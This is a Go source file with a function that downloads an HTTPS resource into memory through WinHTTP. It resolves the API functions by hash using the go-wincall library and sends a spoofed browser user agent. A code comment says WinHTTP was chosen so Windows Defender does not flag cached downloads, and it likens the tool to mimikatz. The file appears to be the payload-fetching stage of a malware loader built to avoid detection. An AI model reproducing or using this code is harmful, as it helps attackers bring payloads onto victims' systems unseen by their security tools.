package net

import (
	"fmt"
	"runtime"
	"unsafe"
	
	"github.com/carved4/go-wincall"
)

func DownloadToMemory(url string) ([]byte, error) {
	if len(url) < 8 {
		return nil, fmt.Errorf("invalid URL")
	}
	
	var host, path string
	
	if url[:8] == "https://" {
		remaining := url[8:]
		slashPos := -1
		for i, c := range remaining {
			if c == '/' {
				slashPos = i
				break
			}
		}
		if slashPos == -1 {
			host = remaining
			path = "/"
		} else {
			host = remaining[:slashPos]
			path = remaining[slashPos:]
		}
	} else {
		return nil, fmt.Errorf("only HTTPS supported")
	}
	
	// using WinHTTP instead of WinINet to avoid IE cache (the PE will still be loaded, but cache gets flagged by windefender for this like mimikatz)
	wincall.LoadLibraryW("winhttp.dll")
	dllHash := wincall.GetHash("winhttp.dll")
	moduleBase := wincall.GetModuleBase(dllHash)
	
	// get WinHTTP function addresses
	winHttpOpenHash := wincall.GetHash("WinHttpOpen")
	winHttpOpenAddr := wincall.GetFunctionAddress(moduleBase, winHttpOpenHash)
	
	winHttpConnectHash := wincall.GetHash("WinHttpConnect")
	winHttpConnectAddr := wincall.GetFunctionAddress(moduleBase, winHttpConnectHash)
	
	winHttpOpenRequestHash := wincall.GetHash("WinHttpOpenRequest")
	winHttpOpenRequestAddr := wincall.GetFunctionAddress(moduleBase, winHttpOpenRequestHash)
	
	winHttpSendRequestHash := wincall.GetHash("WinHttpSendRequest")
	winHttpSendRequestAddr := wincall.GetFunctionAddress(moduleBase, winHttpSendRequestHash)
	
	winHttpReceiveResponseHash := wincall.GetHash("WinHttpReceiveResponse")
	winHttpReceiveResponseAddr := wincall.GetFunctionAddress(moduleBase, winHttpReceiveResponseHash)
	
	winHttpReadDataHash := wincall.GetHash("WinHttpReadData")
	winHttpReadDataAddr := wincall.GetFunctionAddress(moduleBase, winHttpReadDataHash)
	
	winHttpCloseHandleHash := wincall.GetHash("WinHttpCloseHandle")
	winHttpCloseHandleAddr := wincall.GetFunctionAddress(moduleBase, winHttpCloseHandleHash)
	
	// convert strings to UTF-16 for WinHTTP
	userAgent, _ := wincall.UTF16ptr("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36")
	hostUTF16, _ := wincall.UTF16ptr(host)
	pathUTF16, _ := wincall.UTF16ptr(path)
	getUTF16, _ := wincall.UTF16ptr("GET")
	
	// open session
	hSession, _ := wincall.CallWorker(winHttpOpenAddr, userAgent, 0, 0, 0, 0)
	if hSession == 0 {
		return nil, fmt.Errorf("WinHttpOpen failed")
	}
	defer wincall.CallWorker(winHttpCloseHandleAddr, hSession)
	
	// connect to server
	hConnect, _ := wincall.CallWorker(winHttpConnectAddr, hSession, hostUTF16, uintptr(443), 0)
	if hConnect == 0 {
		return nil, fmt.Errorf("WinHttpConnect failed")
	}
	defer wincall.CallWorker(winHttpCloseHandleAddr, hConnect)
	
	// open request
	hRequest, _ := wincall.CallWorker(winHttpOpenRequestAddr, hConnect, getUTF16, pathUTF16, 0, 0, 0, 0x00800000) // WINHTTP_FLAG_SECURE
	if hRequest == 0 {
		return nil, fmt.Errorf("WinHttpOpenRequest failed")
	}
	defer wincall.CallWorker(winHttpCloseHandleAddr, hRequest)
	
	// send request
	result, _ := wincall.CallWorker(winHttpSendRequestAddr, hRequest, 0, 0, 0, 0, 0, 0)
	if result == 0 {
		return nil, fmt.Errorf("WinHttpSendRequest failed")
	}
	
	// receive response
	result, _ = wincall.CallWorker(winHttpReceiveResponseAddr, hRequest, 0)
	if result == 0 {
		return nil, fmt.Errorf("WinHttpReceiveResponse failed")
	}
	
	// read data
	var buffer []byte
	chunk := make([]byte, 4096)
	
	for {
		var bytesRead uint32
		bytesReadPtr := uintptr(unsafe.Pointer(&bytesRead))
		chunkPtr := uintptr(unsafe.Pointer(&chunk[0]))
		
		result, _ := wincall.CallWorker(winHttpReadDataAddr, hRequest, chunkPtr, uintptr(len(chunk)), bytesReadPtr)
		if result == 0 {
			return nil, fmt.Errorf("WinHttpReadData failed")
		}
		
		if bytesRead == 0 {
			break
		}
		
		buffer = append(buffer, chunk[:bytesRead]...)
	}
	
	runtime.KeepAlive(userAgent)
	runtime.KeepAlive(hostUTF16)
	runtime.KeepAlive(pathUTF16)
	runtime.KeepAlive(getUTF16)
	runtime.KeepAlive(chunk)
	
	if len(buffer) == 0 {
		return nil, fmt.Errorf("no data downloaded")
	}
	
	return buffer, nil
}